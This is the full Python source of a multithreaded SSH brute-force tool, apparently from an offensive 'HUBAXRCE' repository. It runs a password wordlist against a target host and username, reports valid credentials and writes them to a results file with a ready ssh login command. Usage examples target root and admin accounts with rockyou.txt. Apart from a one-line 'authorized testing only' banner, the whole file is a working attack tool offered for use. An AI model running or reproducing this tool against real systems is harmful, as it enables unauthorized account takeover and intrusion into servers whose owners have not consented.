#!/usr/bin/env python3
"""
SSH Brute Forcer - Hubax Tool
Part of HUBAXRCE Repository
Author: n0merc
"""

import paramiko
import threading
import queue
import time
import argparse
import sys
import logging
import os
from colorama import Fore, Style, init

init(autoreset=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def print_banner():
    banner = f"""{Fore.CYAN}
██╗  ██╗██╗   ██╗██████╗  █████╗ ██╗  ██╗██████╗  ██████╗███████╗
██║  ██║██║   ██║██╔══██╗██╔══██╗╚██╗██╔╝██╔══██╗██╔════╝██╔════╝
███████║██║   ██║██████╔╝███████║ ╚███╔╝ ██████╔╝██║     █████╗  
██╔══██║██║   ██║██╔══██╗██╔══██║ ██╔██╗ ██╔══██╗██║     ██╔══╝  
██║  ██║╚██████╔╝██████╔╝██║  ██║██╔╝ ██╗██║  ██║╚██████╗███████╗
╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝
{Style.RESET_ALL}
{Fore.RED}SSH Brute Forcer v2.0 - HUBAXRCE Repository{Style.RESET_ALL}
{Fore.YELLOW}git clone https://github.com/n0merc/HUBAXRCE.git{Style.RESET_ALL}
{Fore.YELLOW}Created by n0merc | For authorized testing only{Style.RESET_ALL}
"""
    print(banner)

def check_requirements():
    """Check if required packages are installed"""
    missing = []
    try:
        import paramiko
    except ImportError:
        missing.append("paramiko")
    
    try:
        import colorama
    except ImportError:
        missing.append("colorama")
    
    if missing:
        print(f"{Fore.RED}[!] Missing packages: {', '.join(missing)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Install with: pip install {' '.join(missing)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Or run: pip install -r requirements.txt{Style.RESET_ALL}")
        return False
    return True

class SSHBruteForcer:
    def __init__(self, host, port=22, timeout=5):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.found = False
        self.lock = threading.Lock()
        self.attempts = 0
        self.start_time = time.time()

    def brute_force(self, username, password):
        if self.found:
            return
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.host, port=self.port, username=username, password=password, timeout=self.timeout, banner_timeout=self.timeout)
            with self.lock:
                if not self.found:
                    self.found = True
                    elapsed = time.time() - self.start_time
                    print(f"\n{Fore.GREEN}[+] FUCKING SUCCESS! {username}:{password} works on {self.host}:{self.port}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Time elapsed: {elapsed:.2f} seconds | Attempts: {self.attempts}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Rate: {self.attempts/elapsed:.2f} attempts/second{Style.RESET_ALL}")
                    logger.info(f"Valid credentials: {username}:{password}")
                    
                    # Save results to file
                    self.save_results(username, password, elapsed)
                    
                    client.close()
                    sys.exit(0)
        except paramiko.AuthenticationException:
            with self.lock:
                self.attempts += 1
            print(f"{Fore.RED}[-] Failed: {username}:{password} | Attempts: {self.attempts}{Style.RESET_ALL}", end='\r')
        except Exception as e:
            with self.lock:
                self.attempts += 1
            print(f"{Fore.YELLOW}[!] Error: {e}{Style.RESET_ALL}", end='\r')
        finally:
            try:
                client.close()
            except:
                pass

    def save_results(self, username, password, elapsed):
        """Save successful results to file"""
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"hubax_ssh_results_{timestamp}.txt"
        
        result = f"""# HUBAXRCE SSH Brute Force Results
# Generated: {time.ctime()}
# Tool: ssh_brute.py
# Repository: https://github.com/n0merc/HUBAXRCE.git

[SUCCESS]
Target: {self.host}:{self.port}
Username: {username}
Password: {password}
Time: {elapsed:.2f} seconds
Attempts: {self.attempts}
Rate: {self.attempts/elapsed:.2f} attempts/second

# Commands to use:
ssh {username}@{self.host} -p {self.port}
# Password: {password}
"""
        
        with open(filename, 'w') as f:
            f.write(result)
        print(f"{Fore.CYAN}[*] Results saved to: {filename}{Style.RESET_ALL}")

def load_wordlist(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logger.error(f"Wordlist file {file_path} not found.")
        print(f"{Fore.RED}[!] Wordlist not found: {file_path}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Get wordlists from: https://github.com/danielmiessler/SecLists{Style.RESET_ALL}")
        sys.exit(1)

def worker(brute_forcer, username, password_queue):
    while not brute_forcer.found and not password_queue.empty():
        password = password_queue.get()
        brute_forcer.brute_force(username, password)
        password_queue.task_done()

def main():
    print_banner()
    
    # Check requirements
    if not check_requirements():
        sys.exit(1)
    
    parser = argparse.ArgumentParser(
        description="SSH Brute Forcer - HUBAXRCE Repository",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  {sys.argv[0]} -t 192.168.1.100 -u root -w passwords.txt
  {sys.argv[0]} -t 10.0.0.5 -u admin -w rockyou.txt -th 50 -p 2222
  {sys.argv[0]} -t target.com -u ubuntu -w wordlist.txt -q

Repository: https://github.com/n0merc/HUBAXRCE.git
        """
    )
    
    parser.add_argument("-t", "--target", required=True, help="Target host IP or domain")
    parser.add_argument("-p", "--port", type=int, default=22, help="SSH port (default: 22)")
    parser.add_argument("-u", "--user", required=True, help="Username to brute force")
    parser.add_argument("-w", "--wordlist", required=True, help="Password wordlist file")
    parser.add_argument("-th", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("-to", "--timeout", type=int, default=5, help="Connection timeout in seconds (default: 5)")
    parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode (minimal output)")
    parser.add_argument("-o", "--output", help="Custom output file for results")

    args = parser.parse_args()

    if not args.quiet:
        print_banner()

    print(f"{Fore.CYAN}[*] HUBAXRCE SSH Brute Forcer{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Target: {args.target}:{args.port}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Username: {args.user}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Threads: {args.threads}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Timeout: {args.timeout}s{Style.RESET_ALL}")
    
    if not os.path.exists(args.wordlist):
        print(f"{Fore.RED}[!] Wordlist not found: {args.wordlist}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Download wordlists: git clone https://github.com/danielmiessler/SecLists.git{Style.RESET_ALL}")
        sys.exit(1)
    
    passwords = load_wordlist(args.wordlist)
    print(f"{Fore.CYAN}[*] Loaded {len(passwords)} passwords{Style.RESET_ALL}")
    
    password_queue = queue.Queue()
    for pwd in passwords:
        password_queue.put(pwd)

    brute_forcer = SSHBruteForcer(args.target, args.port, args.timeout)

    print(f"{Fore.CYAN}[*] Starting attack...{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Press Ctrl+C to stop{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Repository: https://github.com/n0merc/HUBAXRCE.git{Style.RESET_ALL}\n")

    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=worker, args=(brute_forcer, args.user, password_queue))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while any(t.is_alive() for t in threads) and not brute_forcer.found:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user.{Style.RESET_ALL}")
        elapsed = time.time() - brute_forcer.start_time
        print(f"{Fore.YELLOW}[!] Attempts made: {brute_forcer.attempts} | Time: {elapsed:.2f}s{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Rate: {brute_forcer.attempts/elapsed:.2f} attempts/second{Style.RESET_ALL}")
        sys.exit(1)

    if not brute_forcer.found:
        elapsed = time.time() - brute_forcer.start_time
        print(f"\n{Fore.RED}[-] No valid password found.{Style.RESET_ALL}")
        print(f"{Fore.RED}[-] Total attempts: {brute_forcer.attempts} | Time: {elapsed:.2f}s{Style.RESET_ALL}")
        print(f"{Fore.RED}[-] Rate: {brute_forcer.attempts/elapsed:.2f} attempts/second{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
